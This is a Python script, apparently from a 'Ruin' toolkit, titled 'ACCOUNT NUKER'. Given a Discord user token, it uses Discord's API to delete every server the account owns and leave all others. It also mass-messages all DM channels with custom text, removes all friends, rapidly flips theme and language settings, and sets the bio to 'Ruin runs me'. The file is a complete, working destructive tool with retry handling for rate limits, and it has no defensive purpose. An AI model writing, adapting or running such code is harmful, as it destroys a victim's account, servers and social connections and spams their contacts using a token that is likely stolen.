import requests
import threading
from itertools import cycle
import random
import time
from colorama import init, Fore, Style
import os
init()
purple = Fore.MAGENTA
white = Fore.WHITE
reset = Style.RESET_ALL
def get_headers(token):
    return {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
def styled_input(prompt):
    print(f"{purple}┌───────────────[ {white}AirFlow - ACCOUNT NUKER{purple} ]───────────────┐{reset}")
    print(f"{purple}│{white} {prompt:<50} {reset}")
    print(f"{purple}│{white} >> {reset}", end="")
    user_input = input()
    print(f"{purple}└──────────────────────────────────────────────────┘{reset}")
    return user_input.strip()
def status_message(message):
    print(f"{purple}[EXECUTING]{white} {message}...{reset}")
def completion_message(message):
    print(f"{purple}[COMPLETE]{white} {message}{reset}")
def custom_seizure(token, stop_event):
    modes = cycle(["light", "dark"])
    languages = cycle(["en-US", "es-ES", "fr", "de", "ja", "ko"])
    while not stop_event.is_set():
        try:
            setting = {
                'theme': next(modes),
                'locale': next(languages)
            }
            requests.patch("https://discord.com/api/v9/users/@me/settings", headers=get_headers(token), json=setting, timeout=10)
            time.sleep(0.5)
        except requests.exceptions.RequestException as e:
            print(f"{purple}[ERROR]{white} Failed to toggle theme/language: {e}{reset}")
def make_request_with_retry(method, url, headers, json=None, max_retries=5):
    for attempt in range(max_retries):
        try:
            if method == "DELETE":
                response = requests.delete(url, headers=headers, json=json, timeout=10)
            elif method == "POST":
                response = requests.post(url, headers=headers, json=json, timeout=10)
            elif method == "PATCH":
                response = requests.patch(url, headers=headers, json=json, timeout=10)
            else:
                response = requests.get(url, headers=headers, timeout=10)
            if response.status_code == 429:
                retry_after = float(response.json().get("retry_after", 1)) + 1
                is_global = response.json().get("global", False)
                print(f"{purple}[INFO]{white} Rate limited (global: {is_global}), retrying after {retry_after} seconds...{reset}")
                time.sleep(retry_after)
                continue
            return response
        except requests.exceptions.Timeout:
            print(f"{purple}[ERROR]{white} Request timed out, retrying... (Attempt {attempt + 1}/{max_retries}){reset}")
            if attempt < max_retries - 1:
                time.sleep(2)
            continue
        except requests.exceptions.RequestException as e:
            print(f"{purple}[ERROR]{white} Request failed: {e}, retrying... (Attempt {attempt + 1}/{max_retries}){reset}")
            if attempt < max_retries - 1:
                time.sleep(2)
            continue
    return None
def account_nuker(token):
    headers = get_headers(token)
    try:
        response = make_request_with_retry("GET", "https://discord.com/api/v9/users/@me", headers)
        if not response or response.status_code != 200:
            print(f"{purple}[ERROR]{white} Invalid token or unable to authenticate: Status {response.status_code if response else 'No response'}, Response: {response.text if response else 'None'}{reset}")
            print(f"{purple}[INFO]{white} Your token might be restricted. Try using a fresh token from the Network tab (Authorization header).{reset}")
            return
        user_info = response.json()
        username = user_info['username'] + "#" + user_info['discriminator']
        print(f"{purple}[INFO]{white} Logged in as {username}{reset}")
    except Exception as e:
        print(f"{purple}[ERROR]{white} Failed to authenticate token: {e}{reset}")
        return
    status_message("Leaving all servers")
    response = make_request_with_retry("GET", "https://discord.com/api/v9/users/@me/guilds", headers)
    if not response or response.status_code != 200:
        print(f"{purple}[ERROR]{white} Failed to fetch guilds: Status {response.status_code if response else 'No response'}, Response: {response.text if response else 'None'}{reset}")
        return
    guilds = response.json()
    if isinstance(guilds, list):
        for guild in guilds:
            guild_id = guild['id']
            guild_name = guild['name']
            if guild.get('owner', False):
                response = make_request_with_retry("DELETE", f"https://discord.com/api/v9/guilds/{guild_id}", headers, json=None)
                if response and response.status_code in [200, 204]:
                    completion_message(f"Deleted owned server: {guild_name}")
                else:
                    print(f"{purple}[ERROR]{white} Failed to delete owned server {guild_name}: Status {response.status_code if response else 'No response'}, Response: {response.text if response else 'None'}{reset}")
            else:
                response = make_request_with_retry("DELETE", f"https://discord.com/api/v9/users/@me/guilds/{guild_id}", headers, json=None)
                if response and response.status_code in [200, 204]:
                    completion_message(f"Left server: {guild_name}")
                else:
                    print(f"{purple}[ERROR]{white} Failed to leave {guild_name}: Status {response.status_code if response else 'No response'}, Response: {response.text if response else 'None'}{reset}")
    custom_message = styled_input("Enter a custom message to send to all friends (leave blank to skip):")
    if custom_message:
        status_message("Sending custom message to all friends")
        response = make_request_with_retry("GET", "https://discord.com/api/v9/users/@me/channels", headers)
        if not response or response.status_code != 200:
            print(f"{purple}[ERROR]{white} Failed to fetch DM channels: Status {response.status_code if response else 'No response'}, Response: {response.text if response else 'None'}{reset}")
            return
        channels = response.json()
        if isinstance(channels, list):
            for channel in channels:
                response = make_request_with_retry(
                    "POST",
                    f"https://discord.com/api/v9/channels/{channel['id']}/messages",
                    headers,
                    json={"content": custom_message}
                )
                if response and response.status_code in [200, 201]:
                    completion_message(f"Sent message to DM channel ID: {channel['id']}")
                else:
                    print(f"{purple}[ERROR]{white} Failed to send message to DM channel {channel['id']}: Status {response.status_code if response else 'No response'}, Response: {response.text if response else 'None'}{reset}")
    status_message("Removing all friends")
    response = make_request_with_retry("GET", "https://discord.com/api/v9/users/@me/relationships", headers)
    if not response or response.status_code != 200:
        print(f"{purple}[ERROR]{white} Failed to fetch relationships: Status {response.status_code if response else 'No response'}, Response: {response.text if response else 'None'}{reset}")
        return
    friends = response.json()
    if isinstance(friends, list):
        for friend in friends:
            if friend['type'] == 1:
                friend_id = friend['id']
                response = make_request_with_retry(
                    "DELETE",
                    f"https://discord.com/api/v9/users/@me/relationships/{friend_id}",
                    headers,
                    json=None
                )
                if response and response.status_code in [200, 204]:
                    completion_message(f"Removed friend: {friend['user']['username']}#{friend['user']['discriminator']}")
                else:
                    print(f"{purple}[ERROR]{white} Failed to remove friend {friend['user']['username']}#{friend['user']['discriminator']}: Status {response.status_code if response else 'No response'}, Response: {response.text if response else 'None'}{reset}")
    stop_event = threading.Event()
    seizure_thread = threading.Thread(target=custom_seizure, args=(token, stop_event))
    seizure_thread.start()
    status_message("Spamming light/dark mode and language changes for 5 seconds")
    time.sleep(5)
    stop_event.set()
    seizure_thread.join()
    completion_message("Theme and language spam completed")
    status_message("Changing bio to 'Ruin runs me'")
    setting = {
        "custom_status": {"text": "Ruin runs me"},
        "bio": "Ruin runs me"
    }
    response = make_request_with_retry("PATCH", "https://discord.com/api/v9/users/@me/settings", headers, json=setting)
    if response and response.status_code in [200, 204]:
        completion_message("Bio updated successfully")
    else:
        print(f"{purple}[ERROR]{white} Failed to change bio: Status {response.status_code if response else 'No response'}, Response: {response.text if response else 'None'}{reset}")
    completion_message("Account Nuker completed its operations")
def main():
    token = styled_input("Enter your Discord user token (not a bot token):")
    if not token:
        print(f"{purple}[ERROR]{white} No user token provided. Exiting...{reset}")
        return
    try:
        account_nuker(token)
    except Exception as e:
        print(f"{purple}[ERROR]{white} An unexpected error occurred: {e}{reset}")
    finally:
        input(f"{purple}[EXIT]{white} Press Enter to return to Ruin menu...{reset}")

if __name__ == "__main__":
    main()